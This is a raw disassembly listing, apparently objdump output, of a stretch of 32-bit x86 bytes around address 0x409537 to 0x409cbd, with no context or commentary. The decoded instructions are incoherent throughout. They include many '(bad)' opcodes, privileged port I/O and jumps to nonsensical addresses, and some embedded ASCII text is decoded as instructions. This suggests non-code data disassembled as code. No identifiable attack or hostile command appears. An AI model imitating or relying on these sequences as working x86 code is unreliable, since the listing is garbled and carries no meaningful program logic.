  409537:	addr16 aaa 
  409539:	fwait
  40953a:	inc    eax
  40953b:	cmp    DWORD PTR [ebx],esi
  40953d:	and    esp,DWORD PTR [eax+0x260b0a1]
  409543:	adc    eax,0x13922bce
  409548:	repnz inc ebp
  40954a:	push   edx
  40954b:	push   eax
  40954c:	sbb    cl,dl
  40954e:	mov    ds:0xddd42c98,eax
  409553:	adc    eax,0x56d81c05
  409558:	and    al,0xb4
  40955a:	out    dx,al
  40955b:	rcr    eax,0xde
  40955e:	sub    al,0x21
  409560:	pop    edi
  409561:	cmp    eax,0x932c1150
  409566:	xchg   BYTE PTR [edx-0x7c3cdff5],ch
  40956c:	out    dx,eax
  40956d:	lock and eax,0x137507f
  409573:	sbb    DWORD PTR [esp+ecx*2-0x182f828b],edx
  40957a:	data16 adc BYTE PTR [ebp+eiz*1+0x56bb443a],cl
  409582:	js     0x4095bc
  409584:	ds js  0x4095ff
  409587:	stc    
  409588:	xor    BYTE PTR [eax],cl
  40958a:	(bad)  
  40958c:	jge    0x40951e
  40958e:	or     eax,DWORD PTR [ebp-0x43]
  409591:	pop    eax
  409592:	pop    esp
  409593:	dec    ecx
  409594:	or     BYTE PTR [ebp+0x17d93380],0x3b
  40959b:	dec    esp
  40959c:	nop    DWORD PTR [ecx+ecx*1+0x44]
  4095a1:	and    BYTE PTR [ebx-0x73bd9933],bh
  4095a7:	sbb    al,ch
  4095a9:	inc    eax
  4095aa:	in     al,dx
  4095ab:	aaa    
  4095ac:	inc    ebx
  4095ad:	nop
  4095ae:	test   al,0x90
  4095b0:	jl     0x409538
  4095b2:	xor    ch,BYTE PTR [eax+ebx*2]
  4095b5:	or     DWORD PTR ds:0x1b63279,esp
  4095bb:	sbb    DWORD PTR [ebx-0x406d027d],ebx
  4095c1:	test   al,0xb7
  4095c3:	add    DWORD PTR [edx],ebx
  4095c5:	sub    DWORD PTR [ecx+eax*1+0x73],ecx
  4095c9:	popa   
  4095ca:	(bad)  
  4095cb:	mov    al,ds:0x2c4cf648
  4095d0:	mov    eax,gs:0xcaa2f45a
  4095d6:	adc    dl,BYTE PTR [eax]
  4095d8:	mov    ch,0xa9
  4095da:	sbb    eax,0x5406ec9b
  4095df:	sub    edx,0xffffffd4
  4095e2:	popa   
  4095e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095e4:	push   ds
  4095e5:	in     al,dx
  4095e6:	xor    BYTE PTR [edi+0x73],ah
  4095e9:	in     al,dx
  4095ea:	fsubr  QWORD PTR [esi+0x10a304ee]
  4095f0:	out    0xe4,al
  4095f2:	repz jo 0x40961c
  4095f5:	mov    edi,DWORD PTR [edx]
  4095f7:	xchg   edx,eax
  4095f8:	push   eax
  4095f9:	pop    esp
  4095fa:	lahf   
  4095fb:	add    DWORD PTR [edx],ebx
  4095fd:	das    
  4095fe:	mov    ebx,DWORD PTR [edx]
  409600:	xchg   edx,eax
  409601:	xor    BYTE PTR [edi-0x5de5fec1],dl
  409607:	push   cs
  409608:	in     al,dx
  409609:	xchg   edx,eax
  40960a:	popa   
  40960b:	js     0x409644
  40960d:	push   0x48fb9bfc
  409612:	cmp    DWORD PTR [eax+0x1],0xffffffc3
  409616:	pop    ss
  409617:	add    eax,0x6f435406
  40961c:	ins    BYTE PTR es:[edi],dx
  40961d:	outs   dx,DWORD PTR ds:[esi]
  40961e:	jb     0x4095f4
  409620:	cmp    DWORD PTR [edi],eax
  409622:	jl     0x4095f7
  409624:	and    BYTE PTR [ebx+ebp*8],0x17
  409628:	nop
  409629:	mov    al,ds:0x79bd047f
  40962e:	push   esp
  40962f:	inc    esi
  409630:	outs   dx,DWORD PTR ds:[esi]
  409631:	dec    edi
  409632:	jb     0x4096a7
  409634:	gs je  0x40963d
  409637:	aam    0x3d
  409639:	cmp    eax,0x1b9021d1
  40963e:	hlt    
  40963f:	ja     0x4096bf
  409641:	add    dl,dh
  409643:	inc    ecx
  409644:	add    DWORD PTR [edx],ebx
  409646:	hlt    
  409647:	add    DWORD PTR [ebx],ebx
  409649:	inc    esp
  40964a:	adc    BYTE PTR [edi],ah
  40964c:	cmp    dh,0x5f
  40964f:	jae    0x4096c0
  409651:	jne    0x4096c5
  409653:	arpl   WORD PTR [ebp+0x4d],sp
  409656:	popa   
  409657:	outs   dx,BYTE PTR ds:[esi]
  409658:	popa   
  409659:	addr16 lahf 
  40965b:	adc    dh,cl
  40965d:	xchg   ebp,eax
  40965e:	add    BYTE PTR [eax-0x77],ah
  409661:	dec    esi
  409662:	and    BYTE PTR [esi+0x1889205c],cl
  409668:	jnp    0x4096a5
  40966a:	fs push eax
  40966c:	retf   0xc52a
  40966f:	fwait
  409670:	add    BYTE PTR [ecx],ah
  409672:	lods   al,BYTE PTR ds:[esi]
  409673:	and    cl,BYTE PTR [edi+0x5d2ff26f]
  409679:	push   edi
  40967a:	pop    es
  40967b:	arpl   WORD PTR [edx+eax*2+0x6c],bp
  40967f:	popa   
  409680:	arpl   WORD PTR [ebx+0xf],bp
  409683:	cmp    edx,DWORD PTR cs:[esi+ebp*2]
  409687:	fwait
  409688:	jb     0x4096f9
  40968a:	or     DWORD PTR [eax],eax
  40968c:	and    eax,DWORD PTR [edi+0x74]
  40968f:	rcl    BYTE PTR [esi+0xf6ec2a2],0x4f
  409696:	ins    BYTE PTR es:[edi],dx
  409697:	dec    ebp
  409698:	add    ch,BYTE PTR [eax+0x1]
  40969b:	outs   dx,BYTE PTR ds:[esi]
  40969c:	pop    es
  40969d:	popf   
  40969e:	aas    
  40969f:	and    bh,bh
  4096a1:	inc    ebx
  4096a2:	dec    esi
  4096a3:	popa   
  4096a4:	jbe    0x40971f
  4096a6:	add    BYTE PTR [eax+0x75],dl
  4096a9:	jb     0x40971b
  4096ab:	ins    BYTE PTR es:[edi],dx
  4096ac:	fdiv   DWORD PTR gs:[edi+0x542397ec]
  4096b3:	gs popa 
  4096b5:	ins    BYTE PTR es:[edi],dx
  4096b6:	rcpps  xmm4,XMMWORD PTR [ecx+0x33]
  4096ba:	adc    BYTE PTR [ecx],bh
  4096bc:	in     al,0x4f
  4096be:	push   ebx
  4096bf:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0xf900572
  4096c7:	cwde   
  4096c8:	mov    eax,ds:0x4c67502f
  4096cd:	imul   ebp,DWORD PTR [ebp+0x65],0x3fc85b6c
  4096d4:	pop    ecx
  4096d5:	gs ins BYTE PTR es:[edi],dx
  4096d7:	ins    BYTE PTR es:[edi],dx
  4096d8:	outs   dx,DWORD PTR ds:[esi]
  4096d9:	ja     0x4096aa
  4096db:	jne    0x409700
  4096dd:	daa    
  4096de:	in     al,0x1f
  4096e0:	sbb    DWORD PTR [ecx],ecx
  4096e2:	inc    esi
  4096e3:	jne    0x409748
  4096e5:	push   0x41616973
  4096ea:	jno    0x4096cd
  4096ec:	in     al,0x97
  4096ee:	mov    ecx,0x57cf1075
  4096f3:	push   0x30c7469
  4096f8:	add    edi,DWORD PTR [ebx]
  4096fa:	mov    ebx,0x79650030
  4096ff:	hlt    
  409700:	add    BYTE PTR [ebx+0x10],cl
  409703:	or     eax,0x6b53ecd8
  409708:	jns    0x409768
  40970a:	cmp    eax,DWORD PTR [ebx-0x4f]
  40970d:	pop    ecx
  40970e:	mov    ebx,0x4d231aec
  409713:	mov    bl,0xda
  409715:	outs   dx,DWORD PTR ds:[esi]
  409716:	inc    edx
  409717:	inc    eax
  409718:	ret    
  409719:	xchg   ebx,eax
  40971a:	push   cs
  40971b:	arpl   WORD PTR [eax+esi*1+0x42],si
  40971f:	scas   eax,DWORD PTR es:[edi]
  409720:	mov    al,ds:0xe1bdf203
  409725:	pop    ss
  409726:	cmovae esp,DWORD PTR [ecx+0x6d]
  40972a:	pop    ds
  40972b:	fsubr  DWORD PTR [ecx]
  40972d:	dec    edi
  40972e:	das    
  40972f:	jo     0x4097a1
  409731:	push   edi
  409732:	sub    al,0x6b
  409734:	xor    BYTE PTR [ecx],bh
  409736:	cmp    edx,DWORD PTR [eax+0x35]
  409739:	fisttp DWORD PTR [edi+ebp*1]
  40973c:	in     al,dx
  40973d:	push   ss
  40973e:	aam    0xaa
  409740:	addr16 mov eax,0x4297646e
  409746:	je     0x40973f
  409748:	fbstp  TBYTE PTR [edx+0x2a466ed8]
  40974e:	inc    ebx
  40974f:	adc    ecx,DWORD PTR [eax+0x69]
  409752:	addr16 push 0x71b0036c
  409758:	enter  0x7459,0x17
  40975c:	or     edx,DWORD PTR [ebx-0x1b]
  40975f:	shr    DWORD PTR fs:[esi],0x24
  409763:	int3   
  409764:	ss aas 
  409766:	sahf   
  409767:	js     0x4097dd
  409769:	xlat   BYTE PTR ds:[ebx]
  40976a:	pop    ecx
  40976b:	shl    BYTE PTR [esi-0x6d],0xd
  40976f:	xchg   ebp,eax
  409770:	pop    ss
  409771:	sub    edi,DWORD PTR ds:0x44fe4384
  409777:	gs popaw 
  40977a:	jne    0x4097e8
  40977c:	pop    ss
  40977d:	retf   
  40977e:	fs imul eax,edx,0x1511acae
  409785:	iret   
  409786:	sbb    DWORD PTR [edi],ebx
  409788:	into   
  409789:	dec    eax
  40978a:	pop    eax
  40978b:	arpl   WORD PTR [ecx-0xa],cx
  40978e:	and    DWORD PTR [edi],ecx
  409790:	or     ah,BYTE PTR [ebp-0x35]
  409793:	dec    cx
  409795:	ins    BYTE PTR es:[edi],dx
  409796:	stos   DWORD PTR es:[edi],eax
  409797:	shl    BYTE PTR [edx+0x13be42d8],0xf
  40979e:	sub    al,0x3f
  4097a0:	int3   
  4097a1:	and    dl,BYTE PTR [edi+0x746f48fd]
  4097a7:	dec    esp
  4097a8:	jmp    0x4097ba
  4097aa:	outs   dx,DWORD PTR ds:[esi]
  4097ab:	fst    DWORD PTR [edx+0x1b7925b3]
  4097b1:	adc    DWORD PTR [ebx+0x4d958426],ecx
  4097b7:	adc    eax,0x4b08031b
  4097bc:	pop    eax
  4097bd:	jmp    0x6fa6b783
  4097c2:	inc    edx
  4097c3:	xor    al,0xbf
  4097c5:	adc    esi,DWORD PTR [ebx-0x40268e7d]
  4097cb:	push   es
  4097cc:	or     ebp,DWORD PTR [esi+0x75]
  4097cf:	setbe  BYTE PTR [ebp-0x3cf66dbe]
  4097d6:	mov    bh,cl
  4097d8:	mov    dl,0x64
  4097da:	pop    ss
  4097db:	not    BYTE PTR [ebx]
  4097dd:	out    0xa,eax
  4097df:	pop    ss
  4097e0:	dec    edi
  4097e1:	jecxz  0x409764
  4097e3:	loopne 0x40981d
  4097e5:	dec    esi
  4097e6:	xchg   edi,eax
  4097e7:	pop    ds
  4097e8:	push   ebx
  4097e9:	arpl   WORD PTR [eax+edi*8],cx
  4097ec:	gs mov esp,0x23510152
  4097f2:	xor    eax,DWORD PTR [esp+eax*2+0x6b]
  4097f6:	push   cs
  4097f7:	ins    DWORD PTR es:[edi],dx
  4097f8:	popa   
  4097f9:	dec    esp
  4097fa:	loopne 0x40981f
  4097fc:	pop    ss
  4097fd:	push   ds
  4097fe:	mov    al,0x1
  409800:	sti    
  409801:	ret    0x57c7
  409804:	imul   ebp,DWORD PTR [esi+0x27],0xec05130d
  40980b:	push   esp
  40980c:	sbb    BYTE PTR [esi-0x73],al
  40980f:	push   0x57
  409811:	push   0xffffff8b
  409813:	ficomp WORD PTR [ebx-0x1dd06ee9]
  409819:	or     ecx,DWORD PTR ds:0x6d83d7fd
  40981f:	push   ecx
  409820:	dec    esp
  409821:	pop    eax
  409822:	ret    
  409823:	push   0x33
  409825:	inc    ebx
  409826:	inc    ebx
  409827:	cmp    BYTE PTR [ebp-0xfa1efca],0x84
  40982e:	fwait
  40982f:	psubb  mm7,mm7
  409832:	ret    
  409833:	into   
  409834:	inc    esp
  409835:	inc    edi
  409836:	inc    ecx
  409837:	dec    esi
  409838:	push   ebx
  409839:	dec    ecx
  40983a:	pop    edi
  40983b:	inc    ebx
  40983c:	dec    eax
  40983d:	inc    ecx
  40983e:	push   edx
  40983f:	push   ebx
  409840:	inc    ebp
  409841:	push   esp
  409842:	add    BYTE PTR [esi-0x4e],al
  409845:	jg     0x409887
  409847:	pop    es
  409848:	inc    esp
  409849:	inc    ebp
  40984a:	inc    esi
  40984b:	inc    ecx
  40984c:	push   ebp
  40984d:	dec    esp
  40984e:	push   esp
  40984f:	sbb    al,bh
  409851:	pop    ds
  409852:	mov    dh,0xec
  409854:	pop    ds
  409855:	push   ebx
  409856:	pop    ecx
  409857:	dec    ebp
  409858:	inc    edx
  409859:	dec    edi
  40985a:	dec    esp
  40985b:	xor    ebx,edi
  40985d:	dec    ebp
  40985e:	inc    ecx
  40985f:	inc    ebx
  409860:	pusha  
  409861:	push   DWORD PTR [ebx]
  409863:	popa   
  409864:	sub    edx,DWORD PTR [eax]
  409866:	dec    eax
  409867:	dec    ecx
  409868:	inc    esi
  409869:	push   esp
  40986a:	dec    edx
  40986b:	dec    ecx
  40986c:	push   ebx
  40986d:	pop    edi
  40986e:	ret    
  40986f:	xchg   esi,eax
  409870:	jge    0x40988d
  409872:	adc    DWORD PTR [esi+0x47],ecx
  409875:	inc    ebp
  409876:	push   ebp
  409877:	dec    eax
  409878:	out    dx,eax
  409879:	jg     0x40982d
  40987b:	fisttp DWORD PTR gs:[edx+0x4f]
  40987f:	adc    BYTE PTR [edx+0x30],al
  409882:	ja     0x4098cb
  409884:	inc    edx
  409885:	xor    dh,BYTE PTR [ebx]
  409887:	xor    DWORD PTR [edx],esi
  409889:	mov    bh,0x4b
  40988b:	ja     0x4098ae
  40988d:	adc    esp,DWORD PTR [ebx+0x43]
  409890:	dec    esi
  409891:	inc    ebp
  409892:	adc    DWORD PTR [edx+0x49],eax
  409895:	or     ecx,ecx
  409897:	dec    edi
  409898:	fld    DWORD PTR [edi+0x35]
  40989b:	dec    ebx
  40989c:	inc    edi
  40989d:	push   edx
  40989e:	inc    ebp
  40989f:	inc    ebp
  4098a0:	dec    ebx
  4098a1:	fistp  DWORD PTR [ebx-0x65]
  4098a4:	xchg   edx,eax
  4098a5:	call   DWORD PTR [ebp+edx*2+0x52]
  4098a9:	dec    ebx
  4098aa:	dec    ecx
  4098ab:	push   ebx
  4098ac:	dec    eax
  4098ad:	dec    eax
  4098ae:	inc    esi
  4098af:	xor    DWORD PTR [edi+0x76],edx
  4098b2:	imul   ebp,DWORD PTR [edi+0x61],0x63
  4098b6:	pop    ss
  4098b7:	push   cs
  4098b8:	xchg   edx,eax
  4098b9:	dec    ecx
  4098ba:	inc    ebx
  4098bb:	pop    ss
  4098bc:	cld    
  4098bd:	(bad)  
  4098be:	in     al,0x57
  4098c0:	inc    edx
  4098c1:	inc    ecx
  4098c2:	dec    esp
  4098c3:	push   esp
  4098c4:	pop    edi
  4098c5:	push   edx
  4098c6:	push   ebp
  4098c7:	push   ebx
  4098c8:	jle    0x409912
  4098ca:	pop    eax
  4098cb:	sub    edx,DWORD PTR [edi+ebx*8+0x5f]
  4098cf:	imul   edx,DWORD PTR [eax+ecx*2+0x41],0x78
  4098d4:	sti    
  4098d5:	dec    dx
  4098d7:	adc    al,BYTE PTR [ebp+0x41]
  4098da:	push   ebx
  4098db:	push   esp
  4098dc:	inc    ebp
  4098dd:	xchg   ebx,eax
  4098de:	dec    edi
  4098df:	push   eax
  4098e0:	inc    ebp
  4098e1:	or     eax,0x574af927
  4098e6:	dec    edi
  4098e7:	inc    ebp
  4098e8:	dec    ebp
  4098e9:	push   0x11
  4098eb:	rol    DWORD PTR [ebp-0x80],cl
  4098ee:	jae    0x4098c9
  4098f0:	xchg   edx,eax
  4098f1:	pusha  
  4098f2:	cmove  ebx,DWORD PTR [edx-0x4a]
  4098f6:	out    0xb,eax
  4098f8:	jecxz  0x4098ae
  4098fa:	mov    ah,0x2
  4098fc:	mov    eax,0xf268b9bc
  409901:	xor    BYTE PTR [ebx+eiz*1],al
  409904:	dec    ebp
  409905:	xchg   esi,eax
  409906:	les    edi,FWORD PTR [ebx-0x6afeff16]
  40990c:	jne    0x6c599a45
  409912:	pop    ss
  409913:	arpl   WORD PTR [eax+ecx*8+0x43],bp
  409917:	sbb    esp,DWORD PTR [edx+ebp*1+0x25]
  40991b:	test   al,0x59
  40991d:	dec    ebp
  40991e:	ss and al,0xef
  409921:	sub    dh,BYTE PTR [ebx-0x2f2977cb]
  409927:	cmp    dl,BYTE PTR [esi+0x4]
  40992a:	les    ebp,FWORD PTR [esi-0x37308802]
  409930:	int3   
  409931:	pop    ss
  409932:	test   BYTE PTR [eax+0x19],0x1
  409936:	je     0x409941
  409938:	mov    DWORD PTR [ebp-0x30],0x380060bc
  40993f:	jae    0x40991e
  409941:	jmp    0x40994a
  409943:	or     BYTE PTR [eax-0x6cfde7ab],dl
  409949:	xchg   ecx,eax
  40994a:	mov    bl,0x97
  40994c:	pop    ebp
  40994d:	mov    BYTE PTR [ebp-0x2c],al
  409950:	or     al,0x4
  409952:	aad    0x6
  409954:	mov    ah,0x9b
  409956:	xchg   ecx,eax
  409957:	or     dh,dl
  409959:	mov    al,BYTE PTR [eax+0x1a]
  40995c:	or     BYTE PTR [edi-0x4923ab75],dh
  409962:	stos   DWORD PTR es:[edi],eax
  409963:	push   ebp
  409964:	jo     0x409928
  409966:	sbb    esi,edi
  409968:	or     eax,0x6e82a906
  40996d:	mov    edx,0x1a0b6489
  409972:	fwait
  409973:	jne    0x40998d
  409975:	or     dl,BYTE PTR ds:0xda1d9fbe
  40997b:	fldenv [eax+0x63aa452a]
  409981:	fs inc ebx
  409983:	mov    edx,0xb4385b25
  409988:	sbb    dh,BYTE PTR [esi+edi*2-0x390932ae]
  40998f:	inc    ebp
  409990:	fiadd  DWORD PTR [eax]
  409992:	add    ebx,eax
  409994:	fldcw  WORD PTR [ebx+eiz*1]
  409997:	push   0xad6fc8fe
  40999c:	sahf   
  40999d:	sub    BYTE PTR [ebp-0x24eb0ff8],ch
  4099a3:	add    ch,bl
  4099a5:	xchg   ecx,eax
  4099a6:	fcomp  DWORD PTR [edx+0x1050abb]
  4099ac:	jmp    0x4099b2
  4099ae:	add    BYTE PTR [eax+eax*8],dh
  4099b1:	mov    ecx,esp
  4099b3:	add    BYTE PTR ds:0x894ba8bb,0x42
  4099ba:	xchg   ebp,eax
  4099bb:	and    ebp,DWORD PTR [eax+eiz*1]
  4099be:	div    BYTE PTR [eax]
  4099c0:	mov    WORD PTR [esi],fs
  4099c2:	jo     0x409a17
  4099c4:	or     eax,0x83292458
  4099c9:	jo     0x4099de
  4099cb:	push   esp
  4099cc:	xchg   BYTE PTR [ecx],bl
  4099ce:	leave  
  4099cf:	pusha  
  4099d0:	inc    esi
  4099d1:	add    BYTE PTR [eax],cl
  4099d3:	fwait
  4099d4:	ins    BYTE PTR es:[edi],dx
  4099d5:	lods   eax,DWORD PTR ds:[esi]
  4099d6:	sbb    al,BYTE PTR [edx]
  4099d8:	test   eax,0x2f18f5e8
  4099dd:	rcr    DWORD PTR [ebp+0xdec8b05],0x93
  4099e4:	jne    0x409a5e
  4099e6:	adc    esi,DWORD PTR [edx+0x20]
  4099e9:	jg     0xf6b694bb
  4099ef:	or     eax,DWORD PTR [ebp-0x47]
  4099f2:	cmp    BYTE PTR [eax],cl
  4099f4:	retf   0xf1c
  4099f7:	mov    bh,0x4
  4099f9:	inc    ebp
  4099fa:	sbb    eax,0xa001de89
  4099ff:	outs   dx,BYTE PTR ds:[esi]
  409a00:	(bad)  
  409a01:	out    dx,al
  409a02:	imul   edx,eax,0xffffffee
  409a05:	xor    BYTE PTR [esi+0x7cbc1f3c],ah
  409a0b:	aam    0x3c
  409a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a0e:	fs fs in al,dx
  409a11:	mov    eax,0x73cc0124
  409a16:	(bad)  
  409a17:	loopne 0x4099ad
  409a19:	inc    eax
  409a1a:	or     BYTE PTR [edi-0x6f],bl
  409a1d:	inc    esi
  409a1e:	mov    al,ds:0x9f983212
  409a23:	lock or BYTE PTR [esi],ah
  409a26:	pop    edi
  409a27:	and    al,0x7d
  409a29:	mov    ds:0x86c6ccd0,eax
  409a2e:	jl     0x409a57
  409a30:	and    al,0xe1
  409a32:	mov    ds:0x43a8917b,eax
  409a37:	mov    ebx,0xc71eb904
  409a3c:	xchg   ebp,eax
  409a3d:	pop    ss
  409a3e:	push   ecx
  409a3f:	dec    edi
  409a40:	int    0x46
  409a42:	mov    bl,0x6c
  409a44:	pop    ss
  409a45:	push   ebx
  409a46:	mov    fs:0x78474e31,eax
  409a4c:	ss add al,0x1c
  409a4f:	stos   DWORD PTR es:[edi],eax
  409a50:	clc    
  409a51:	outs   dx,BYTE PTR ds:[esi]
  409a52:	xor    al,0x7a
  409a54:	sub    dl,0x1
  409a57:	push   es
  409a58:	dec    edx
  409a59:	jmp    0x409a6b
  409a5b:	adc    eax,0x4cd74cf0
  409a60:	push   edi
  409a61:	fidivr DWORD PTR [edx]
  409a63:	add    DWORD PTR [edi],ecx
  409a65:	or     BYTE PTR [edx],al
  409a67:	mov    ecx,0xee09b66c
  409a6c:	call   0xf526ca73
  409a71:	jns    0x409a21
  409a73:	fs lock mov al,fs:0x47b8d0e8
  409a7b:	push   ebp
  409a7c:	or     BYTE PTR [edi-0x5417b888],cl
  409a82:	push   edi
  409a83:	adc    ebx,DWORD PTR [edx+0x43ff97b0]
  409a89:	mov    eax,ds:0x50b34382
  409a8e:	or     al,0x98
  409a90:	adc    al,0x9
  409a92:	or     DWORD PTR [eax-0x54fc52b0],ebx
  409a98:	arpl   WORD PTR [edx+ebp*4-0x76],bx
  409a9c:	mul    BYTE PTR ds:0xc426554c
  409aa2:	mul    BYTE PTR [esi]
  409aa4:	and    cl,BYTE PTR [eax+0x74]
  409aa7:	push   edi
  409aa8:	push   esi
  409aa9:	lods   al,BYTE PTR ds:[esi]
  409aaa:	je     0x409ae2
  409aac:	sub    esp,DWORD PTR [eax]
  409aae:	inc    edi
  409aaf:	(bad)  
  409ab0:	jecxz  0x409b09
  409ab2:	push   cs
  409ab3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ab5:	adc    bh,BYTE PTR [ebp+0x507b9c25]
  409abb:	add    BYTE PTR [ebx],dl
  409abd:	or     BYTE PTR [esi],dl
  409abf:	dec    ebx
  409ac0:	xchg   esp,eax
  409ac1:	pop    edx
  409ac2:	sahf   
  409ac3:	add    al,0x82
  409ac5:	and    ecx,DWORD PTR [esi]
  409ac7:	and    al,0xf8
  409ac9:	cmp    eax,DWORD PTR [ecx]
  409acb:	and    eax,0x211561a3
  409ad0:	imul   esi,DWORD PTR [eax+0x730190d7],0xb81c98b3
  409ada:	dec    ebx
  409adb:	inc    ecx
  409adc:	or     edx,DWORD PTR es:[esi]
  409adf:	scas   eax,DWORD PTR es:[edi]
  409ae0:	lods   al,BYTE PTR ds:[esi]
  409ae1:	hlt    
  409ae2:	adc    al,0xf0
  409ae4:	fsub   QWORD PTR [ecx+ebp*4-0x30]
  409ae8:	test   al,0xa7
  409aea:	jne    0x409b0c
  409aec:	into   
  409aed:	or     eax,0xf28bf812
  409af2:	push   ds
  409af3:	lods   al,BYTE PTR ds:[esi]
  409af4:	js     0x409b69
  409af6:	inc    ecx
  409af7:	push   eax
  409af8:	das    
  409af9:	and    BYTE PTR [ecx+0x5a],bl
  409afc:	mov    edi,0xbc44b556
  409b01:	jae    0x409b07
  409b03:	fimul  DWORD PTR [eax+0x7]
  409b06:	or     bl,BYTE PTR [esi]
  409b08:	(bad)  
  409b09:	jmp    DWORD PTR [esi]
  409b0b:	jo     0x409b04
  409b0d:	shl    BYTE PTR [edx],1
  409b0f:	inc    ebx
  409b10:	or     BYTE PTR [edx-0x2fc5f7ad],cl
  409b16:	je     0x409b4f
  409b18:	pop    ebp
  409b19:	mov    BYTE PTR [edx-0x39f87389],dh
  409b1f:	dec    esp
  409b20:	adc    cl,BYTE PTR [eax+edx*2+0x5da10e5d]
  409b27:	mov    dh,0x64
  409b29:	nop
  409b2a:	cmp    cl,BYTE PTR [eax-0x1fddddfe]
  409b30:	push   esp
  409b31:	(bad)  
  409b32:	shr    BYTE PTR [ebp-0x284da55e],1
  409b38:	daa    
  409b39:	jo     0x409ae6
  409b3b:	xor    BYTE PTR [ebx+0x262f3f8e],0xa7
  409b42:	adc    al,0x9e
  409b44:	inc    eax
  409b45:	add    edx,DWORD PTR [ecx-0x23]
  409b48:	xchg   eax,edx
  409b4a:	inc    eax
  409b4b:	inc    ebx
  409b4c:	outs   dx,DWORD PTR ds:[esi]
  409b4d:	and    BYTE PTR [ebx],0x41
  409b50:	cmp    al,BYTE PTR [ebx+0x1c]
  409b53:	mov    eax,DWORD PTR [eax+eax*4]
  409b56:	arpl   WORD PTR [eax],cx
  409b58:	jo     0x409b50
  409b5a:	idiv   BYTE PTR [ebx-0x7fee7102]
  409b60:	dec    ebx
  409b61:	or     BYTE PTR [ecx],al
  409b63:	mov    DWORD PTR [ecx+0x2a18538d],ebx
  409b69:	hlt    
  409b6a:	inc    DWORD PTR [ebx]
  409b6c:	es adc al,0x8b
  409b6f:	lods   eax,DWORD PTR ds:[esi]
  409b70:	lock mov bl,BYTE PTR [esi+0x8]
  409b74:	not    ebx
  409b76:	inc    ebx
  409b77:	add    al,0xfc
  409b79:	out    dx,al
  409b7a:	and    bl,BYTE PTR [esp]
  409b7d:	jns    0x409ba6
  409b7f:	cmp    BYTE PTR [edx],bh
  409b81:	ret    
  409b82:	je     0x409bd7
  409b84:	push   eax
  409b85:	inc    ebp
  409b86:	lds    ecx,FWORD PTR [ecx+0x50]
  409b89:	and    al,0xa1
  409b8b:	adc    DWORD PTR [edx-0x3d57ee31],0x7f
  409b92:	inc    edi
  409b93:	adc    dh,ah
  409b95:	and    BYTE PTR [ecx+0x285b1558],bh
  409b9b:	add    bh,BYTE PTR [esi+0x1cb21e38]
  409ba1:	mov    dl,0xb
  409ba3:	add    al,0x64
  409ba5:	or     BYTE PTR [edx+ecx*1-0x24a08412],dl
  409bac:	pop    ebp
  409bad:	mov    BYTE PTR [edx],al
  409baf:	outs   dx,DWORD PTR ds:[esi]
  409bb0:	add    bh,al
  409bb2:	ror    DWORD PTR [eax+ebx*1],0x22
  409bb6:	sbb    ebp,DWORD PTR [esi-0x27]
  409bb9:	and    eax,eax
  409bbb:	repnz adc DWORD PTR [eax+ebx*1-0x36460c9c],esp
  409bc3:	adc    al,0x28
  409bc5:	lahf   
  409bc6:	sub    edx,DWORD PTR [eax]
  409bc8:	and    esi,DWORD PTR [eax+0x64]
  409bcb:	dec    edi
  409bcc:	call   0x46:0x18d2100e
  409bd3:	das    
  409bd4:	mul    BYTE PTR ss:[ebx]
  409bd7:	enter  0xeb20,0x24
  409bdb:	adc    BYTE PTR [edx],dl
  409bdd:	xor    BYTE PTR ds:0x4b2d9808,cl
  409be3:	cmp    eax,0xb06c2f11
  409be8:	push   cs
  409be9:	shl    BYTE PTR [ebx+ecx*1],1
  409bec:	or     BYTE PTR [edi+0x10],dh
  409bef:	push   0x21
  409bf1:	popa   
  409bf2:	in     eax,0xb0
  409bf4:	add    dl,BYTE PTR [edx+0x18]
  409bf7:	and    edx,DWORD PTR [eax+ecx*4+0x25580c96]
  409bfe:	add    DWORD PTR [ebx-0x44bc3421],edi
  409c04:	clc    
  409c05:	sti    
  409c06:	mov    WORD PTR [ebp+0x8030007],0xfbfa
  409c0f:	fist   DWORD PTR ds:0xa7dd13a2
  409c15:	pop    es
  409c16:	mov    ecx,0xa04fe40
  409c1b:	dec    esi
  409c1c:	and    BYTE PTR [esi-0x6b9cd85c],0x6b
  409c23:	push   eax
  409c24:	sub    DWORD PTR [ecx+ebp*1],esi
  409c27:	push   0xb
  409c29:	test   al,0x18
  409c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c2c:	push   0xefac7171
  409c31:	inc    ebp
  409c32:	aam    0xad
  409c34:	sti    
  409c35:	out    0x8c,eax
  409c37:	mov    dh,BYTE PTR [edi+0x661fd3d]
  409c3d:	mov    dl,BYTE PTR [eax-0x62]
  409c40:	push   ds
  409c41:	call   0xfc5959c7
  409c46:	jmp    0xc0:0x13b685b5
  409c4d:	call   0x9764:0x850b1f4c
  409c54:	sbb    dh,BYTE PTR [edi+0x5008f2c3]
  409c5a:	and    esp,DWORD PTR [ecx]
  409c5c:	push   esi
  409c5d:	push   eax
  409c5e:	in     al,dx
  409c5f:	arpl   WORD PTR [esi-0x73],di
  409c62:	test   BYTE PTR [ebp-0x4a48c020],al
  409c68:	leave  
  409c69:	xchg   esi,eax
  409c6a:	in     al,dx
  409c6b:	pop    es
  409c6c:	push   ebx
  409c6d:	sbb    eax,0xdb171c35
  409c72:	in     al,dx
  409c73:	mov    dl,0x93
  409c75:	adc    ebp,ebx
  409c77:	push   ds
  409c78:	xor    ebx,esp
  409c7a:	jae    0x409caf
  409c7c:	or     BYTE PTR [ebx+0x7],bh
  409c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c80:	and    eax,0x15182973
  409c85:	enter  0xc1b1,0x2a
  409c89:	cmp    BYTE PTR [eax+0x70f88d8e],al
  409c8f:	and    BYTE PTR ds:0x4fb02b63,dl
  409c95:	hlt    
  409c96:	or     eax,0xaf5b9db2
  409c9b:	inc    esi
  409c9c:	sub    ah,dh
  409c9e:	clc    
  409c9f:	retf   0xb600
  409ca2:	xchg   edx,eax
  409ca3:	adc    BYTE PTR [eax+0x3aaf4864],dl
  409ca9:	jo     0x409cb6
  409cab:	pop    edi
  409cac:	jl     0x409d07
  409cae:	cmp    eax,DWORD PTR ds:0x5eb854e
  409cb4:	mov    dh,0xaf
  409cb6:	adc    eax,0xb856d832
  409cbb:	ds out dx,eax
  409cbd:	xor    esi,DWORD PTR [esi]
